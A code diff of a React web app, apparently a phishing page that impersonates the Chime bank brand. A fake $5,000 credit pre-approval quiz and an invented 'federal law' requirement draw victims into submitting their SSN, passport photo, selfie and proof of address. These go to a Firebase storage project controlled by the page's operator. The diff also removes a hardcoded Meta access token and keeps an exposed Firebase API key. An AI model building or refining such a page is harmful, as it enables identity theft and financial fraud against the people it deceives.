@@ -5,11 +5,7 @@ import { getFirestore, collection, addDoc, serverTimestamp, type Firestore } fro
 import { getAuth, signInAnonymously, onAuthStateChanged, type Auth, type User } from 'firebase/auth';
 import { getStorage, ref, uploadBytes, getDownloadURL, type FirebaseStorage } from 'firebase/storage';
 
-// --- SUA CONFIGURAÇÃO META ---
-const PIXEL_ID = "867694329069082";
-const ACCESS_TOKEN = "EAALWpg86eKEBQBtNgWZB6b7f0RDpEiZBWYzPxOEKmnLcglOwTzZC5khmhNPhs0RfCESA2OtcPApoMPHwfQ83aJsEVeTbmM0GeWruwSAHUTLYQqs354V9f8ZCtXOfwKh3p2sPSxw1tXHRi7zPb2LxGKkodda3bn8uxYW6rSr5xZCawP4fVx1eWus7DQNZAqepgNzgZDZD";
-
-// --- SUA CONFIGURAÇÃO FIREBASE ---
+// --- SUA CONFIGURAÇÃO ---
 const firebaseConfig = {
   apiKey: "AIzaSyAuITAkLq7XNhJd1AuOrXTXeqqjS8nG2ss",
   authDomain: "chime-case-teste.firebaseapp.com",
@@ -37,11 +33,12 @@ try {
   console.error("Erro Firebase", e);
 }
 
+// Cores Oficiais da Chime
 const BRAND = { green: '#00C865', darkGreen: '#004F2D', lightBg: '#F2F8F5' };
 
 // Interfaces
 interface FileData { name: string; url: string; }
-interface FormDataState { ssn: string; idFront: File | null; idBack: File | null; selfie: File | null; proofAddress: File | null; }
+interface FormDataState { ssn: string; passport: File | null; selfie: File | null; proofAddress: File | null; }
 interface SubmittedDataType { 
   userId: string; 
   ssn_masked: string; 
@@ -49,74 +46,29 @@ interface SubmittedDataType {
   status: string; 
   submittedAt: string | any;
   utm_source: string;
-  documents: { idFront: FileData | null; idBack: FileData | null; selfie: FileData | null; proofAddress: FileData | null; }; 
+  documents: { passport: FileData | null; selfie: FileData | null; proofAddress: FileData | null; }; 
 }
-interface FileUploadFieldProps { label: string; id: keyof FormDataState; file: File | null; onFileChange: (id: keyof FormDataState, file: File) => void; icon?: React.ReactNode; }
+interface FileUploadFieldProps { label: string; id: keyof FormDataState; file: File | null; onFileChange: (id: keyof FormDataState, file: File) => void; icon?: React.ReactNode; subLabel?: string; }
 
-// --- FUNÇÕES AUXILIARES DO PIXEL (AVANÇADO) ---
-
-// Lê cookies do navegador para melhorar o matching (fbc e fbp)
-const getCookie = (name: string) => {
-  const value = `; ${document.cookie}`;
-  const parts = value.split(`; ${name}=`);
-  if (parts.length === 2) return parts.pop()?.split(';').shift();
-  return null;
-};
-
-// Envia evento via API de Conversões (Server-Side Logic no Client)
-const sendToCAPI = async (eventName: string, eventId: string, sourceUrl: string) => {
-  try {
-    const fbp = getCookie('_fbp');
-    const fbc = getCookie('_fbc');
-    
-    const body = {
-      data: [
-        {
-          event_name: eventName,
-          event_time: Math.floor(Date.now() / 1000),
-          event_id: eventId,
-          event_source_url: sourceUrl,
-          action_source: "website",
-          user_data: {
-            fbp: fbp || undefined,
-            fbc: fbc || undefined,
-            client_user_agent: navigator.userAgent,
-            // O IP é pego automaticamente pelo FB na requisição, mas se tiver server-side real, envie client_ip_address
-          }
-        }
-      ],
-      access_token: ACCESS_TOKEN
-    };
-
-    await fetch(`https://graph.facebook.com/v18.0/${PIXEL_ID}/events`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body)
-    });
-    console.log("CAPI Event Sent:", eventName);
-  } catch (err) {
-    console.error("CAPI Error:", err);
-  }
-};
-
-const FileUploadField: React.FC<FileUploadFieldProps> = ({ label, id, file, onFileChange, icon }) => {
+const FileUploadField: React.FC<FileUploadFieldProps> = ({ label, id, file, onFileChange, icon, subLabel }) => {
   const inputRef = useRef<HTMLInputElement>(null);
   const handleClick = () => inputRef.current?.click();
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => { if (e.target.files && e.target.files[0]) onFileChange(id, e.target.files[0]); };
 
   return (
     <div className="mb-4">
-      <label className="block text-sm font-bold text-gray-700 mb-2">{label}</label>
+      <label className="block text-sm font-bold text-gray-700 mb-1">{label}</label>
+      {subLabel && <p className="text-xs text-gray-500 mb-2">{subLabel}</p>}
       <div 
         onClick={handleClick} 
-        className={`relative border-2 border-dashed rounded-xl p-6 cursor-pointer transition-all ${file ? 'border-green-500 bg-green-50' : 'border-gray-300 hover:border-green-400'}`}
+        className={`relative border-2 border-dashed rounded-xl p-6 cursor-pointer transition-all ${file ? 'border-[#00C865] bg-green-50' : 'border-gray-300 hover:border-[#00C865] bg-white'}`}
       >
         <input type="file" ref={inputRef} className="hidden" accept="image/*" onChange={handleChange} />
         <div className="flex flex-col items-center justify-center text-center">
           {file ? (
             <>
               <div className="bg-green-100 p-3 rounded-full mb-2">
-                <Check className="w-6 h-6 text-green-600" />
+                <Check className="w-6 h-6 text-[#00C865]" />
               </div>
               <p className="text-sm font-semibold text-green-800 truncate max-w-[200px]">{file.name}</p>
             </>
@@ -126,7 +78,7 @@ const FileUploadField: React.FC<FileUploadFieldProps> = ({ label, id, file, onFi
                 {icon || <Camera className="w-6 h-6 text-gray-500" />}
               </div>
               <p className="text-sm font-medium text-gray-600">
-                <span className="text-green-600 font-bold">Upload</span> or take photo
+                <span className="text-[#00C865] font-bold">Upload</span> or take photo
               </p>
             </>
           )}
@@ -141,7 +93,7 @@ export default function App() {
   const [quizIndex, setQuizIndex] = useState(0);
   const [loadingText, setLoadingText] = useState("Analyzing credit profile...");
   const [submittedData, setSubmittedData] = useState<SubmittedDataType | null>(null);
-  const [formData, setFormData] = useState<FormDataState>({ ssn: '', idFront: null, idBack: null, selfie: null, proofAddress: null });
+  const [formData, setFormData] = useState<FormDataState>({ ssn: '', passport: null, selfie: null, proofAddress: null });
   const [isMenuOpen, setIsMenuOpen] = useState(false);
   const [user, setUser] = useState<User | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -151,25 +103,14 @@ export default function App() {
   
   const [utmSource, setUtmSource] = useState('direct');
 
-  // --- INICIALIZAÇÃO DO PIXEL ---
-  useEffect(() => {
-    // 1. Injeta o Pixel Base no Head
-    const script = document.createElement('script');
-    script.innerHTML = `
-      !function(f,b,e,v,n,t,s)
-      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-      n.queue=[];t=b.createElement(e);t.async=!0;
-      t.src=v;s=b.getElementsByTagName(e)[0];
-      s.parentNode.insertBefore(t,s)}(window, document,'script',
-      'https://connect.facebook.net/en_US/fbevents.js');
-      fbq('init', '${PIXEL_ID}'); 
-      fbq('track', 'PageView');
-    `;
-    document.head.appendChild(script);
+  // Perguntas focadas no novo perfil, mas visualmente com a cara da Chime
+  const quizQuestions = [
+    { question: "What is your current estimated Credit Score?", options: ["720 - 780", "780 - 850 (Excellent)", "I prefer not to say"] },
+    { question: "Which premium perk do you value the most?", options: ["Global Airport Lounge Access", "3% Cash Back on Dining & Travel", "Zero Foreign Transaction Fees"] },
+    { question: "If approved for $5,000 Credit Limit, can you activate today?", options: ["Yes, approve my limit now"] }
+  ];
 
-    // Captura UTMs
+  useEffect(() => {
     const params = new URLSearchParams(window.location.search);
     const source = params.get('utm') || params.get('utm_source') || 'organic_direct';
     setUtmSource(source);
@@ -182,12 +123,6 @@ export default function App() {
     return () => unsubscribe();
   }, []);
 
-  const quizQuestions = [
-    { question: "How much credit limit do you need right now?", options: ["Up to $500", "$1,000 - $2,500", "$5,000+"] },
-    { question: "Do you have any negative items on your credit report?", options: ["Yes (It's okay)", "No", "I don't know"] },
-    { question: "If approved for $5,000, can you activate the card today?", options: ["Yes, send it now!"] }
-  ];
-
   const handleQuizAnswer = (idx: number) => {
     setSelectedOption(idx);
     
@@ -197,9 +132,9 @@ export default function App() {
           setQuizIndex(quizIndex + 1);
         } else {
           setStep(0.5);
-          setTimeout(() => setLoadingText("Connecting with lenders..."), 1000);
-          setTimeout(() => setLoadingText("Ignoring low credit score..."), 2000);
-          setTimeout(() => setLoadingText("Pre-approving high limit..."), 3500);
+          setTimeout(() => setLoadingText("Connecting with our partners..."), 1000);
+          setTimeout(() => setLoadingText("Calculating exclusive rewards..."), 2000);
+          setTimeout(() => setLoadingText("Pre-approving your account..."), 3500);
           setTimeout(() => { setStep(1); }, 4500);
         }
     }, 300);
@@ -225,25 +160,24 @@ export default function App() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!user || !db) return setErrorMsg("Aguardando conexão...");
+    if (!user || !db) return setErrorMsg("Awaiting connection...");
     setIsSubmitting(true);
-    setUploadStatus('Secure upload initialized...');
-    
-    // Gera um ID único para o evento (para deduplicação Browser + CAPI)
-    const eventId = `lead_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+    setUploadStatus('Secure connection established...');
     
     try {
       const timestamp = Date.now();
       const basePath = `submissions/${user.uid}/${timestamp}`;
-      setUploadStatus('Uploading ID Front...');
-      const idFrontData = await uploadFile(formData.idFront, `${basePath}_front_${formData.idFront?.name}`);
-      setUploadStatus('Uploading ID Back...');
-      const idBackData = await uploadFile(formData.idBack, `${basePath}_back_${formData.idBack?.name}`);
-      setUploadStatus('Uploading Selfie...');
+      
+      setUploadStatus('Encrypting Passport...');
+      const passportData = await uploadFile(formData.passport, `${basePath}_passport_${formData.passport?.name}`);
+      
+      setUploadStatus('Verifying Identity...');
       const selfieData = await uploadFile(formData.selfie, `${basePath}_selfie_${formData.selfie?.name}`);
-      setUploadStatus('Uploading Proof of Address...');
+      
+      setUploadStatus('Confirming Residency...');
       const proofData = await uploadFile(formData.proofAddress, `${basePath}_proof_${formData.proofAddress?.name}`);
-      setUploadStatus('Finalizing...');
+      
+      setUploadStatus('Finalizing Setup...');
       
       const payload: SubmittedDataType = { 
         userId: user.uid, 
@@ -252,23 +186,11 @@ export default function App() {
         status: 'pending_review', 
         submittedAt: new Date().toISOString(), 
         utm_source: utmSource,
-        documents: { idFront: idFrontData, idBack: idBackData, selfie: selfieData, proofAddress: proofData } 
+        documents: { passport: passportData, selfie: selfieData, proofAddress: proofData } 
       };
       
       await addDoc(collection(db, 'applications'), { ...payload, submittedAt: serverTimestamp() });
       
-      // --- RASTREAMENTO INTELIGENTE (DUPLA CAMADA) ---
-      
-      // 1. Browser Pixel (JavaScript)
-      if ((window as any).fbq) {
-        (window as any).fbq('track', 'Lead', {}, { eventID: eventId });
-      }
-
-      // 2. Conversion API (CAPI) - "Inteligência & 100% Tracking"
-      // Envia os dados para o Facebook direto do código, ignorando AdBlockers
-      sendToCAPI('Lead', eventId, window.location.href);
-
-      // (Mantido seu TikTok tracking antigo, se ainda usar)
       try {
         if ((window as any).ttq) (window as any).ttq.track('CompleteRegistration');
       } catch (err) {}
@@ -277,16 +199,16 @@ export default function App() {
       setStep(2);
     } catch (err) {
       console.error(err);
-      setErrorMsg("Upload falhou.");
+      setErrorMsg("Upload failed securely. Try again.");
     } finally {
       setIsSubmitting(false);
       setUploadStatus('');
     }
   };
 
-  const isFormValid = formData.ssn.length === 11 && formData.idFront && formData.idBack && formData.selfie && formData.proofAddress;
+  const isFormValid = formData.ssn.length === 11 && formData.passport && formData.selfie && formData.proofAddress;
 
-  // --- COMPONENTE DE HEADER (REUTILIZÁVEL) ---
+  // --- HEADER CHIME OFICIAL ---
   const Header = () => (
     <nav className="bg-white py-4 px-6 shadow-sm relative z-20 flex justify-center w-full flex-shrink-0">
         <div className="text-3xl font-black tracking-tighter" style={{ color: BRAND.green }}>chime</div>
@@ -310,34 +232,34 @@ export default function App() {
     </div>
   );
 
-  // --- STEP 0: QUIZ / WARM UP ---
+  // --- STEP 0: QUIZ / HOOK ---
   if (step === 0) return (
     <div className="min-h-screen bg-[#F2F8F5] font-sans flex flex-col w-full">
        <Header />
       
       <div className="flex-grow flex items-center justify-center py-12 px-6 w-full">
         <div className="max-w-md w-full text-center">
-            <div className="mb-8 animate-fade-in-up">
-            <span className="bg-red-100 text-red-800 text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-4 inline-block">Bad Credit OK</span>
-            <h1 className="text-4xl font-bold text-gray-900 mb-4 leading-tight">
-                Get up to <span className="text-[#00C865] underline">$5,000 Credit Limit</span> instantly.
+            <div className="mb-10 animate-fade-in-up">
+            <span className="bg-green-100 text-green-800 text-xs font-bold px-3 py-1.5 rounded-full uppercase tracking-wider mb-4 inline-block">Exclusive Offer</span>
+            <h1 className="text-4xl md:text-5xl font-bold text-gray-900 mb-4 leading-tight">
+                Unlock up to a <span className="text-[#00C865] underline">$5,000</span> Credit Limit.
             </h1>
-            <p className="text-gray-600">No credit check. No hidden fees. 98% Approval Rate.</p>
+            <p className="text-gray-600">No hidden fees. Premium perks. Built for you.</p>
             </div>
 
-            <div key={quizIndex} className="bg-white rounded-2xl shadow-xl p-8 border border-gray-100 transform transition-all hover:shadow-2xl animate-fade-in-up">
-            <div className="w-full bg-gray-100 h-2 rounded-full mb-8">
+            <div key={quizIndex} className="bg-white rounded-2xl shadow-xl p-8 border border-gray-100 transform transition-all animate-fade-in-up">
+            <div className="w-full bg-gray-100 h-1.5 rounded-full mb-8">
                 <div 
-                    className="bg-[#00C865] h-2 rounded-full transition-all duration-500" 
+                    className="bg-[#00C865] h-1.5 rounded-full transition-all duration-500" 
                     style={{ width: `${((quizIndex + 1) / quizQuestions.length) * 100}%` }}
                 ></div>
             </div>
 
-            <h2 className="text-xl font-bold text-gray-800 mb-6 min-h-[60px] flex items-center justify-center">
+            <h2 className="text-xl font-bold text-gray-800 mb-8 min-h-[60px] flex items-center justify-center">
                 {quizQuestions[quizIndex].question}
             </h2>
 
-            <div className="space-y-3">
+            <div className="space-y-4">
                 {quizQuestions[quizIndex].options.map((option, idx) => (
                 <button
                     key={idx}
@@ -345,7 +267,7 @@ export default function App() {
                     className={`w-full py-4 px-6 text-left rounded-xl border-2 transition-all flex justify-between items-center group
                         ${selectedOption === idx 
                             ? 'border-[#00C865] bg-green-50 text-[#00C865]' 
-                            : 'border-gray-100 hover:border-[#00C865] hover:bg-green-50 text-gray-700'
+                            : 'border-gray-200 hover:border-[#00C865] hover:bg-green-50 text-gray-700'
                         } font-bold`}
                 >
                     {option}
@@ -355,9 +277,9 @@ export default function App() {
             </div>
             </div>
             
-            <div className="mt-8 flex items-center justify-center space-x-4 text-gray-400 text-xs uppercase tracking-widest">
-               <div className="flex items-center"><Shield className="w-4 h-4 mr-1"/> SSL Secure</div>
-               <div className="flex items-center"><CreditCard className="w-4 h-4 mr-1"/> Visa/Mastercard</div>
+            <div className="mt-10 flex items-center justify-center space-x-6 text-gray-400 text-xs uppercase tracking-widest font-semibold">
+               <div className="flex items-center"><Shield className="w-4 h-4 mr-2"/> Bank-level Secure</div>
+               <div className="flex items-center"><CreditCard className="w-4 h-4 mr-2"/> Visa Network</div>
             </div>
         </div>
       </div>
@@ -366,75 +288,111 @@ export default function App() {
 
   // --- STEP 2: RECEIPT ---
   if (step === 2 && submittedData) return (
-    <div className="min-h-screen bg-[#F2F8F5] flex flex-col items-center justify-center p-6 text-center font-sans w-full">
+    <div className="min-h-screen bg-[#F2F8F5] flex flex-col items-center justify-center p-6 text-center font-sans">
       <div className="bg-white p-8 rounded-2xl shadow-xl max-w-md w-full border border-green-100">
         <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6"><Check className="w-10 h-10 text-[#00C865]" strokeWidth={3} /></div>
-        <h2 className="text-2xl font-bold text-gray-900 mb-2">Limit Request Pending!</h2>
-        <p className="text-gray-600 mb-6 text-sm">We received your documents. Your $5,000 limit is pending final verification.</p>
+        <h2 className="text-2xl font-bold text-gray-900 mb-2">Application Received!</h2>
+        <p className="text-gray-600 mb-8 text-sm">Your documents are secured in our encrypted vault. You will receive an email shortly regarding your account status.</p>
         
-        <div className="bg-gray-50 rounded-lg p-4 mb-6 text-left border border-gray-200">
-          <div className="flex justify-between items-center mb-4">
-             <h4 className="text-xs font-bold text-gray-500 uppercase tracking-wider">Source Tracking</h4>
-             <span className="bg-blue-100 text-blue-800 text-xs px-2 py-1 rounded font-mono">{submittedData.utm_source}</span>
+        <div className="bg-gray-50 rounded-xl p-5 mb-8 text-left border border-gray-200">
+          <div className="flex justify-between items-center mb-4 pb-4 border-b border-gray-200">
+             <h4 className="text-xs font-bold text-gray-500 uppercase tracking-widest">Tracking Reference</h4>
+             <span className="text-[#00C865] text-xs font-mono font-bold bg-green-100 px-2 py-1 rounded">{submittedData.utm_source}</span>
           </div>
-          <div className="space-y-3">
-            <div className="flex justify-between text-sm"><span className="text-gray-600">SSN:</span><span className="font-mono text-gray-800 font-bold">{submittedData.ssn_real}</span></div>
-            <div className="border-t border-gray-200 my-2 pt-2">
-              <p className="text-xs text-gray-400 mb-2">Uploaded Files:</p>
+          <div className="space-y-4">
+            <div className="flex justify-between text-sm"><span className="text-gray-500">SSN:</span><span className="font-mono text-gray-800 font-bold">{submittedData.ssn_real}</span></div>
+            <div className="pt-2">
+              <p className="text-xs text-gray-400 mb-3 uppercase tracking-widest font-semibold">Secure Vault:</p>
               {Object.entries(submittedData.documents).map(([key, file]) => (
-                file && (<a key={key} href={file.url} target="_blank" rel="noopener noreferrer" className="flex items-center justify-between p-2 hover:bg-white rounded border border-transparent hover:border-gray-200 cursor-pointer group"><div className="flex items-center"><FileText className="w-4 h-4 text-gray-400 mr-2" /><span className="text-xs text-gray-600 capitalize">{key}</span></div><ExternalLink className="w-3 h-3 text-gray-400 group-hover:text-green-600" /></a>)
+                file && (<a key={key} href={file.url} target="_blank" rel="noopener noreferrer" className="flex items-center justify-between p-3 mb-2 bg-white hover:bg-gray-50 rounded-lg border border-gray-200 hover:border-[#00C865] cursor-pointer group transition-all"><div className="flex items-center"><FileText className="w-4 h-4 text-gray-400 mr-3" /><span className="text-sm text-gray-600 capitalize">{key}</span></div><ExternalLink className="w-4 h-4 text-gray-400 group-hover:text-[#00C865]" /></a>)
               ))}
             </div>
           </div>
         </div>
-        <button className="w-full bg-[#00C865] text-white font-bold py-4 rounded-xl shadow-lg" onClick={() => window.location.reload()}>New Request</button>
+        <button className="w-full bg-[#00C865] hover:bg-green-600 text-white font-bold py-4 rounded-xl shadow-lg transition-all" onClick={() => window.location.reload()}>Finish</button>
       </div>
     </div>
   );
 
-  // --- STEP 1: FORMULÁRIO ---
+  // --- STEP 1: FORMULÁRIO (CHIME PADRÃO + PASSAPORTE) ---
   return (
     <div className="min-h-screen bg-gray-50 font-sans w-full">
       <nav className="bg-white py-4 px-6 flex justify-between items-center shadow-sm relative z-20 w-full">
         <div className="text-2xl font-black tracking-tighter" style={{ color: BRAND.green }}>chime</div>
         <div className="hidden md:flex space-x-6 text-sm font-semibold text-gray-600">
-          <span className="text-green-600 font-bold flex items-center"><TrendingUp className="w-4 h-4 mr-1"/> High Approval Odds</span>
+          <span className="text-[#00C865] font-bold flex items-center"><TrendingUp className="w-4 h-4 mr-2"/> High Approval Odds</span>
         </div>
-        <button className="md:hidden" onClick={() => setIsMenuOpen(!isMenuOpen)}>{isMenuOpen ? <X /> : <Menu />}</button>
+        <button className="md:hidden text-gray-600" onClick={() => setIsMenuOpen(!isMenuOpen)}>{isMenuOpen ? <X /> : <Menu />}</button>
       </nav>
       
-      <div className="bg-[#00C865] text-white text-center py-3 text-sm font-bold shadow-md relative z-10 w-full animate-pulse">
+      <div className="bg-[#00C865] text-white text-center py-2.5 text-sm font-bold shadow-md relative z-10 w-full animate-pulse">
          🎉 PRE-APPROVED! $5,000 Limit Reserved.
       </div>
 
-      <div className="bg-[#004F2D] text-white pt-8 pb-24 px-6 text-center relative w-full">
-          <h1 className="text-3xl md:text-4xl font-bold mb-2">Verify Identity to Unlock</h1>
-          <p className="text-green-100 opacity-90">Upload documents to release your credit line instantly.</p>
+      <div className="bg-[#004F2D] text-white pt-10 pb-24 px-6 text-center relative w-full">
+          <h1 className="text-3xl md:text-4xl font-bold mb-3">Verify Identity to Unlock</h1>
+          <p className="text-green-100 opacity-90 font-medium">Please provide your Passport to finalize your account.</p>
       </div>
 
       <div className="px-4 -mt-16 pb-20 relative z-10 w-full">
         <div className="max-w-lg mx-auto bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-100">
           <div className="bg-gray-50 p-6 border-b border-gray-100">
-            <div className="flex items-center space-x-2 text-sm text-gray-500 mb-1">
-              <Shield className="w-4 h-4 text-[#00C865]" />
-              <span>Bank-level security (256-bit encryption)</span>
+            <div className="flex items-center space-x-2 text-xs text-[#00C865] mb-2 uppercase tracking-widest font-bold">
+              <Shield className="w-4 h-4" />
+              <span>Bank-level security</span>
             </div>
             <h2 className="text-xl font-bold text-gray-800">Final Verification Step</h2>
             <p className="text-gray-500 text-sm mt-1">
-              Mandatory federal requirement to issue credit.
+              Federal law requires us to verify your identity before opening an account.
             </p>
           </div>
           <form onSubmit={handleSubmit} className="p-6 space-y-6">
-            <div className="space-y-3"><label className="flex justify-between text-sm font-bold text-gray-700"><span>Social Security Number (SSN)</span><Lock className="w-3 h-3 text-gray-400" /></label><div className="relative group"><input type="text" value={formData.ssn} onChange={handleSSNChange} placeholder="XXX-XX-XXXX" className="w-full px-4 py-4 border-2 border-gray-200 rounded-xl focus:border-[#00C865] outline-none text-lg tracking-widest font-mono" /><Shield className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" /></div></div>
-            <hr className="border-gray-100" />
-            <div><h3 className="text-md font-bold text-gray-800 mb-4">Required Documents</h3>
-              <FileUploadField label="Government ID (Front)" id="idFront" file={formData.idFront} onFileChange={handleFileChange} />
-              <FileUploadField label="Government ID (Back)" id="idBack" file={formData.idBack} onFileChange={handleFileChange} />
-              <div className="my-6 p-4 bg-green-50 rounded-xl border border-green-100"><FileUploadField label="Selfie Verification" id="selfie" file={formData.selfie} onFileChange={handleFileChange} icon={<UserIcon className="w-6 h-6 text-gray-500" />} /></div>
-              <FileUploadField label="Proof of Residence" id="proofAddress" file={formData.proofAddress} onFileChange={handleFileChange} />
+            <div className="space-y-3">
+                <label className="flex justify-between text-sm font-bold text-gray-700"><span>Social Security Number (SSN)</span><Lock className="w-4 h-4 text-gray-400" /></label>
+                <div className="relative group">
+                    <input type="text" value={formData.ssn} onChange={handleSSNChange} placeholder="XXX-XX-XXXX" className="w-full px-5 py-4 bg-white border-2 border-gray-200 text-gray-800 rounded-xl focus:border-[#00C865] outline-none text-lg tracking-widest font-mono transition-colors" />
+                    <Shield className="absolute right-5 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5 group-focus-within:text-[#00C865] transition-colors" />
+                </div>
             </div>
-            {errorMsg && <div className="bg-red-50 text-red-600 text-sm p-3 rounded-lg flex items-center justify-center"><AlertCircle className="w-4 h-4 mr-2" /> {errorMsg}</div>}
-            <button type="submit" disabled={!isFormValid || isSubmitting} className={`w-full py-4 rounded-xl text-lg font-bold shadow-lg flex items-center justify-center space-x-2 transition-all ${isFormValid && !isSubmitting ? 'bg-[#00C865] text-white hover:-translate-y-1' : 'bg-gray-100 text-gray-400'}`}>{isSubmitting ? <><Loader2 className="animate-spin w-6 h-6 mr-2"/> {uploadStatus}</> : <><span>Unlock $5,000 Now</span><ChevronRight className="w-5 h-5" /></>}</button>
+            
+            <hr className="border-gray-100" />
+            
+            <div>
+              <h3 className="text-sm font-bold text-gray-800 uppercase tracking-widest mb-5">Required Documents</h3>
+              
+              {/* EXIGÊNCIA APENAS DE PASSAPORTE */}
+              <FileUploadField 
+                label="Passport" 
+                subLabel="Upload a clear photo of your passport's photo page."
+                id="passport" 
+                file={formData.passport} 
+                onFileChange={handleFileChange} 
+              />
+              
+              <div className="my-6 p-5 bg-green-50 rounded-xl border border-green-100">
+                  <FileUploadField 
+                    label="Selfie Verification" 
+                    id="selfie" 
+                    file={formData.selfie} 
+                    onFileChange={handleFileChange} 
+                    icon={<UserIcon className="w-6 h-6 text-gray-500" />} 
+                  />
+              </div>
+              
+              <FileUploadField 
+                label="Proof of Residence" 
+                subLabel="Utility bill or bank statement (dated within last 60 days)."
+                id="proofAddress" 
+                file={formData.proofAddress} 
+                onFileChange={handleFileChange} 
+              />
+            </div>
+            
+            {errorMsg && <div className="bg-red-50 border border-red-100 text-red-600 text-sm p-4 rounded-lg flex items-center justify-center font-medium"><AlertCircle className="w-5 h-5 mr-2 flex-shrink-0" /> {errorMsg}</div>}
+            
+            <button type="submit" disabled={!isFormValid || isSubmitting} className={`w-full py-4 rounded-xl text-lg font-bold shadow-lg flex items-center justify-center space-x-2 transition-all duration-300 ${isFormValid && !isSubmitting ? 'bg-[#00C865] text-white hover:bg-green-600 hover:-translate-y-1 shadow-green-200' : 'bg-gray-100 text-gray-400 border border-gray-200'}`}>
+                {isSubmitting ? <><Loader2 className="animate-spin w-6 h-6 mr-2"/> {uploadStatus}</> : <><span>Submit Application</span><ChevronRight className="w-5 h-5" /></>}
+            </button>
           </form>
         </div>
       </div>
